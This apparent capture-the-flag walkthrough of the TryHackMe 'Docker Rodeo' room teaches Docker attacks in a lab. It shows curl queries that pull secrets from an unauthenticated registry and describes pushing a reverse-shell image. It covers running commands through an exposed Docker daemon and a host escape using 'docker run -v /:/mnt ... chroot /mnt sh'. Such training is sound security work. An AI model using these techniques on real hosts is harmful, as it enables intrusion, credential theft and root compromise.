# The Docker Rodeo

**Room Link:** [https://tryhackme.com/room/dockerrodeo](https://tryhackme.com/room/dockerrodeo)



**Kali**

```
echo "$VICTIM docker-rodeo.thm" >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
subl /etc/docker/daemon.json
```

**daemon.json**

```
{
  "insecure-registries" : ["docker-rodeo.thm:5000","docker-rodeo.thm:7000"]
}
```

**Kali**

```
sudo systemctl stop docker
```

Wait for approximately 30 seconds

**Kali**

```
sudo systemctl start docker
```

## Interacting with a Docker Registry

As with any system that we are going to be penetration testing, we need to enumerate the services running to understand any potential entry points. In our case, Docker Registry runs on port 5000 by default, however, this can be easily changed, so it is worth confirming via with a nmap scan like so:&#x20;

**Kali**

```
sudo nmap -sV $VICTIM
```

\
\
\
Not only is Nmap capable of discovering the Docker Registry, but also the API version - this is important to note for how we will interact with it.\
The Docker Registry is a JSON endpoint, so we cannot just simply interact with it like we would a normal website - we will have to query it. Whilst this can be done via the terminal or browser, dedicated tools such as [Postman ](https://www.postman.com/downloads/)or [Insomnia ](https://insomnia.rest/download/)are much better suited for the job. I will be using Postman in this room.\
To understand what routes are available to us, we need to read the [Docker Registry Documentation](https://docs.docker.com/registry/spec/api/). Please take the time to read this at your leisure.\
3.2.1. Discovering Repositories We need to send a `GET` request to `http://docker-rodeo.thm:5000/v2/_catalog` to list all the repositories registered on the registry.

<figure><img src="https://i.imgur.com/rz4orgs.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
curl -X GET http://docker-rodeo.thm:5000/v2/_catalog
```

**Kali**

```
curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
```

<div align="center">

<img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/catalog1.png" alt="">

</div>

\
In this example, we're given a response of three repositories. For now, we are only going to focus on "cmnatic/myapp1".\
Before we can begin analysing a repository, we need two key pieces of information: 1. The repository name2. Any repository tag(s) published\
We currently have the repository name (cmnatic/myapp1) now we just need to list all tags that have been published. Every repository will have a minimum of one tag. This tag is the "latest" tag, but there can be many tags, all with different code, for example, major software versions or two tags for "production" and "development".\
Send a `GET` request to`http://docker-rodeo.thm:5000/v2/repository/name/tags/list` to query all published tags. For our application, our request would look like so: `http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list`:

**Kali**

```
curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
```

\
![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/listingtags.png)\
\
Note here we have three tags? That "notsecure" tag sure sounds interesting. We now have both pieces of information to retrieve the manifest files of the image for analysis.\
3.2.2. Grabbing the Data!\
With these two important pieces of information about a repository known, we can enumerate that specific repository for a manifest file. This manifest file contains various pieces of information about the application, such as size, layers and other information. I'm going to grab the manifest file for the "notsecure" tag via the following `GET`request: `http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure`

**Kali**

```
curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure
```

\
Note the response - specifically the "history" key;  albeit slightly hard to read, we have a command that was executed during the image building stage stored in plaintext (`` echo \\\"here's a flag\\\" \\u003e /root/root.txt\"]` `` ). In this image, it's a string insert into /root/root.txt on the container. Although imagine if this was a password!\


<div align="center">

<img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/manifest1.png" alt="">

</div>

**What is the port number of the 2nd Docker registry?**

**Kali**

```
sudo nmap -sV $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**What is the name of the repository within this registry?**

**Kali**

```
curl -X GET http://docker-rodeo.thm:7000/v2/_catalog
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**What is the name of the tag that has been published?**

**Kali**

```
curl -X GET http://docker-rodeo.thm:7000/v2/securesolutions/webserver/tags/list
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**What is the Username in the database configuration?**

**Kali**

```
curl -X GET http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**What is the Password in the database configuration?**

**Kali**

```
curl -X GET http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## Vulnerability #2: Reverse Engineering Docker Images

We'll be following on from the previous vulnerability outlined in Task 3. "Abusing a Docker Registry".\
As we've discovered, we are able to query the Docker registry and the data contained within without needing to authenticate. \
Not only can we query Docker registries, but a fundamental feature of Docker is being able to download these repositories for someone to use themselves. This is known as an image; tools such as [Dive ](https://github.com/wagoodman/dive)to reverse engineer these images that we download.\
Without doing it justice, [Dive](https://github.com/wagoodman/dive) acts as a man-in-the-middle between ourselves and Docker when we use it to run a container. Dive monitors and reassembles how each layer is created and the containers file system at each stage.\
We'll start off with an example. Let's download a Docker image from our vulnerable repository and starting _diving_ in. \
4.1. [Install Dive](https://github.com/wagoodman/dive#installation) from their official GitHub

**Kali**

```
DIVE_VERSION=$(curl -sL "https://api.github.com/repos/wagoodman/dive/releases/latest" | grep '"tag_name":' | sed -E 's/.*"v([^"]+)".*/\1/')
curl -OL https://github.com/wagoodman/dive/releases/download/v${DIVE_VERSION}/dive_${DIVE_VERSION}_linux_amd64.deb
sudo apt install ./dive_${DIVE_VERSION}_linux_amd64.deb
```

\
4.2. Download the Docker image we are going to decompile using

**Kali**

```
docker pull docker-rodeo.thm:5000/dive/example
```

&#x20;\
Note: If you receive this warning:`Error response from daemon: Get https://docker-rodeo.thm:5000/v2/: http: server gave HTTP response to HTTPS client`you need to revisit Step 1 in the first task of this room and then restart your Computer to ensure Docker has properly restarted.\


<div align="center">

<img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/pullerror.png" alt="">

</div>

\
4.3. Find the IMAGE\_ID of the repository image that we have downloaded in Step 2:4.3.1. run `docker images` and look for the name of the repository we downloaded `docker-rodeo.thm:5000/dive/example`4.3.2. The "IMAGE\_ID" is the value in the third column:



**Kali**

```
docker images
```

<figure><img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/diveexample-id.png" alt=""><figcaption></figcaption></figure>

In this case, it is "_398736241322"_ for me.4.4 Start dive by running `dive` and provide the "IMAGE\_ID" of the image we want to decompile. For example:&#x20;

**Kali**

```
dive 398736241322
```

\
\
4.5. Using DiveDive is a little overwhelming at first, however, it quickly makes sense. We have four different views, we are only interested in these three views:4.5.1. Layers (pictured in red)4.5.1.1. This window shows the various layers and stages the docker container has gone through4.6.1. Current Layer Contents (pictured in green)4.6.1.1. This window shows you the contents of the container's filesystem at the selected layer4.7.1. Layer Details (pictured in red)4.7.1.1. Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer.\


<figure><img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive.png" alt=""><figcaption></figcaption></figure>

![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive2.png)

* Navigate the data within the current window using the "Up" and "Down" Arrow-keys.
* You can swap between the Windows using the "Tab" key.\


\
4.8. Disassembling Our First Image in DiveLooking at the "Layers" window in the top-left, we can see a total of 7 individual layers\
\
\
Note how we can see the commands executed by the container when the image is being built in the "Layers" panel.\
For example, take a look at the first layer then press the "Tab" key to switch windows and scroll down (using the arrow keys) to the "home" directory in "Current Layer Contents" and then press the "Tab" key again to switch back to the "Layers" window.\


<figure><img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive3.png" alt=""><figcaption></figcaption></figure>

<div align="center">

<img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive4.png" alt="">

</div>

\
At the 1st layer, there is nothing located in "/home" (highlighted in green in the above screenshot) on the container. However, if we were to proceed to the 2nd layer, the command `mkdir -p /home/user` is executed, and now we can see the directory "/home/user" (highlighted in red) has now been made on the container.\


![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive5.png)

4.9. ChallengePull the challenge image using

**Kali**

```
docker pull docker-rodeo.thm:5000/dive/challenge
```

&#x20;and apply what we have done above for the questions below.\
\
Remember! You will need to use `docker images` to get the "IMAGE\_ID" for the new image and use that with the `dive` command.

**What is the "IMAGE\_ID" for the "challenge" Docker image that you just downloaded?**

**Kali**

```
docker images
```

<figure><img src="../../.gitbook/assets/image (859).png" alt=""><figcaption></figcaption></figure>

**Using Dive, how many "Layers" are there in this image?**

**Kali**

```
dive 2a0a63ea5d88
```

<figure><img src="../../.gitbook/assets/image (860).png" alt=""><figcaption></figcaption></figure>

**What user is successfully added?**

<figure><img src="../../.gitbook/assets/image (861).png" alt=""><figcaption></figcaption></figure>

## Vulnerability #3: Uploading Malicious Docker Images

Continuing with exploiting the vulnerable Docker Registry from Task 3. "Abusing a Docker Registry", we can upload (or `push`) our own images to a repository, containing malicious code. Repositories can have as little or as many tags as the owners wish. However, every repository is guaranteed to have a "latest" tag. This tag is a copy of the latest upload of an image.\
When a `docker pull` or `docker run` command is issued, Docker will first try to find a copy of the image (i.e. cmnatic/myapp1) on the host and then proceed to check if there have been any changes made on the Docker registry it was _pulled_ from. If there are changes, Docker will download the updated image onto the host and then proceed to execute.\
Without proper authentication, we can upload our own image to the target's registry. That way, the next time the owner runs a`docker pull`or `docker run` command, their host will download and execute our malicious image as it will be a new version for Docker.\
The screenshot below is a "Dockerfile" that uses the Docker `RUN` instruction to execute "netcat" within the container to connect to our machine! \


<div align="center">

<img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/malicious/reverseshell1.png" alt="">

</div>

\
We compile this into an image with `docker build`. Once compiled and added to the vulnerable registry, we set up a listener on our attacker machine and wait for the new image to be executed by the target.\


<div align="center">

<img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/malicious/reverseshell2.png" alt="">

</div>

\
Note this will only grant us root access to the container using the image, and not the actual host - but it's a connection as root nonetheless. We can start to use these newly gained root privileges to look for configuration files, passwords or attempt to escape!\
_Additional reading:_ [_A Malicious DockerHub Image allowed attackers mine cryptocurrency_](https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/malicious-docker-hub-container-images-cryptocurrency-mining)\


## Vulnerability #4: RCE via Exposed Docker Daemon

﻿6.1. Unix Sockets 101 (no travel adapter required)\


If I were to mention the word "socket" you would most likely think of networking, right? Well, you're not wrong in doing so. With that said, what is often seldom discussed is UNIX sockets...Put simply, a UNIX socket accomplishes the same job as its networking sibling - moving data, albeit all within the host itself by using the filesystem rather than networking interfaces/adapters; Interprocess Communication (IPC) is an essential part to an operating system. Due to the fact that UNIX sockets use the filesystem directly, you can use filesystem permissions to decide who or what can read/write.

There was an interesting [benchmark test](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/) between using both types of sockets for querying a MySQL database. Notice in the screenshot below how there are an incredibly higher amount of queries performed when using UNIX sockets; database systems such as Redis are known for their performance due to this reason.\


<div align="center">

<img src="https://www.percona.com/blog/wp-content/uploads/2020/04/image2-2.png" alt="">

</div>

[(Percona., 2020)](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/)

\


6.2. How does this pertain to Docker?

Users interact with Docker by using the Docker Engine. For example, commands such as `docker pull` or `docker run` will be executed by the use of a socket - this can either be a UNIX or a TCP socket, but by default, it is a UNIX socket. This is why you must be a part of the "docker" group to use the docker command (remembering that UNIX sockets can use file permissions here!) as illustrated below:

The user "cmnatic" is in the "docker" group\


\


<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups1.png" alt=""><figcaption></figcaption></figure>

And can therefore run commands like `docker images`\


\


<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups2.png" alt=""><figcaption></figcaption></figure>

Whereas, the user "notcmnatic" is not in the "docker" group and cannot run Docker commands due to lack of permissions to the Docker socket.\


<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups4.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups3.png" alt=""><figcaption></figcaption></figure>

6.3. Automating all the things

Developers love to automate, and this is proven nonetheless with Docker. Whilst Docker uses a UNIX socket, meaning that it can only interact from the host itself. However, someone may wish to remotely execute Docker commands such as in Docker management tools like Portainer or DevOps applications like Jenkins to test their program.

To achieve this, the daemon must use a TCP socket instead, permitting data for the Docker daemon to be communicated using the network interface and ultimately exposing it to the network for us to exploit.\


***

6.4. Practical:

6.4.1. Enumerate, enumerate, enumerate...\
We'll need to enumerate the host to look for this exposed service. By default, the engine will run on port 2375 - let's confirm this by performing another Nmap scan against your Instance (10.10.119.179).

_Please note that you may need to upgrade your version of Nmap (or proceed to "Step 2") if this port does not appear in your Nmap scan._

\


<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/nmap1.png" alt=""><figcaption></figcaption></figure>

6.4.2. Confirming vulnerability.\
Great! Looks like it's open, we're going to use the `curl` command to start interacting with the exposed Docker daemon.

Confirming that we can access the Docker daemon:

**Kali**

```
curl http://$VICTIM:2375/version
```

And note that we receive a response will all sorts of data about the host - lovely!\


<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/curl1.png" alt=""><figcaption></figcaption></figure>

6.4.3. Execute\
We'll perform our first Docker command by using the "-H" switch to specify the Instance to list the containers running&#x20;



**Kali**

```
docker -H tcp://$VICTIM:2375 ps
```

\


<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/docker1.png" alt=""><figcaption></figcaption></figure>

6.4.4. Experiment\
Of course, listing the running containers is the least that we can do at this stage. We can start to create our own, extract their filesystems and look for data, or execute commands on the host itself. Here are a few docker commands that I'll leave for you to experiment with:

| <p>network ls<br></p> | <p>Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!<br></p> | <p><br></p> |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ----------- |
| <p>images<br></p>     | <p>List images used by containers, data can also be exfiltrated by reverse-engineering the image.<br></p>                                        | <p><br></p> |
| <p>exec<br></p>       | <p>Execute a command on a container<br></p>                                                                                                      | <p><br></p> |
| <p>run<br></p>        | <p>Run a container<br></p>                                                                                                                       | <p><br></p> |

Experiment with some [Docker commands](https://raw.githubusercontent.com/sangam14/dockercheatsheets/master/dockercheatsheet8.png) to enumerate the machine, try to gain a shell onto some of the containers and take a look at using tools such as [rootplease ](https://registry.hub.docker.com/r/chrisfosterelli/rootplease)to use Docker to create a root shell on the device itself.

## Vulnerability #5: Escape via Exposed Docker Daemon

For this task, we're going to assume that we have managed to gain a foothold onto the container from something such as a vulnerable website running in a container.

7.1. Step 1. Connecting to the container:\


Connect to your Instance using SSH with the following details:

IP: 10.10.119.179

SSH Port: 2233

Username: danny

Password: danny

\


7.2. Looking for the exposed Docker socket\
Armed with the knowledge we've learnt about the Docker socket in "_Vulnerability #4: RCE via Exposed Docker Daemon_", we can look for exposure of this file within the container, and confirm whether or not the current user has permissions to run docker commands with `groups`.

<div align="center">

<img src="https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock1.png" alt="">

</div>

\


7.3. Mount host volumes\
In the instance of this room, I have already downloaded the "alpine" image to the container that you are exploiting. In a THM room, you will most likely have to upload this image to the container before you can execute it, as Instances do not deploy with an internet connection.

Now that we've confirmed we can execute Docker commands, let's mount the host directory to a new container and then connect to that to reveal all the data on the host OS!&#x20;

**Kali**

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

```

<div align="center">

<img src="https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock2.png" alt="">

</div>

_Note: If you do not receive any output after 30 seconds you will need to cancel the command by "Ctrl + C" and attempt to run it again._

We are essentially mounting the hosts "/" directory to the "/mnt" dir in a new container, chrooting and then connecting via a shell.

7.4. Verify lootSuccess! We have a shell, let's verify who we're now connected as and enumerate around the file system.

<div align="left">

<img src="https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock3.png" alt="">

</div>







